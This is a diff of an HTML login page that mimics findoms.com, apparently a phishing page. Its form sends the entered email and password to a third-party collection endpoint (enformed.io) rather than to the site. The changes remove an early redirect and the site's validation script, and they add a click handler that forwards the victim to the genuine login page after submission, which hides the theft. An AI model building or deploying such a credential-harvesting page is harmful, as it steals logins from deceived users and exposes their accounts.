@@ -111,12 +111,7 @@ Register </a>
 </div>
 <div class="_block_content"><div class="_block location_2" data-location="2"></div>
 <div id="js_login_form_msg"></div>
-<script type="text/javascript">
-function Validation_js_login_form(form)
-{ $Core.onSubmitForm(form); return true; }
-</script> 
 <form method="post" action="https://www.enformed.io/rwa3l9al" id="js_login_form">
-<script>window.location = "https://findoms.com/index.php/user/login/";</script>
 <div class="form-group">
 <input class="form-control" placeholder="Email" type="email" name="val[login]" id="login" value="" size="40" autofocus="">
 </div>
@@ -134,8 +129,14 @@ Remember me </label>
 </div>
 </div>
 <div class="form-button-group">
-<button id="_submit" type="submit" class="btn btn-primary">
+<button id="submit_submit" type="submit" class="btn btn-primary">
 Sign in </button>
+
+<script type="text/javascript">
+    document.getElementById("submit_submit").onclick = function () {
+        location.href = "https://findoms.com/index.php/user/login/";
+    };
+</script>
 <div class="form-group new-member">
 Need an account? <a class="keepPopup" rel="hide_box_title visitor_form" href="https://findoms.com/index.php/user/register/">Sign Up</a>
 </div>
